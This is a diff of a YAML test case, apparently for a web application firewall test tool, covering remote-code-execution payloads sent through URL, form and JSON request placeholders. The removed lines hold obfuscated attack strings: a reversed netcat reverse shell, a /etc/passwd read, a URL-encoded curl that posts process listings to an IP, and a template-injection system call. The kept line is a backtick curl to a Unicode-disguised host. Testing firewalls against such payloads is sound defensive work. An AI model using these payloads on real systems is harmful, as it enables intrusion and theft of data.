@@ -1,17 +1,10 @@
----
-payload:
-  - $(printf 'hsab/nib/ e- 4321 1.0.0.721 cn'|rev)
-  - /etc/passwd
-  - "`curl -L http://\u24BC\u24C4\u24C4\u24BC\u24C1\u24BA.\u24B8\u24C4\u24C2`"
-  - curl%2520-X%2520POST%2520--data%2520%22%24%28ps%2520-aux%29%22%2520192.168.1.91%2F%3F%60id%60
-  - '{{var this.getTemplateFilter().addAfterFilterCallback("system").filter("whoami")}}'
-  - services.logging.getLogger("foo").error("Job content executed")
 encoder:
-  - URL
+- URL
+payload:
+- "`curl -L http://\u24BC\u24C4\u24C4\u24BC\u24C1\u24BA.\u24B8\u24C4\u24C2`"
 placeholder:
-  - URLParam
-  - HTMLForm
-  - HTMLMultipartForm
-  - JSONRequest
-type: "RCE"
-...
+- URLParam
+- HTMLForm
+- HTMLMultipartForm
+- JSONRequest
+type: RCE
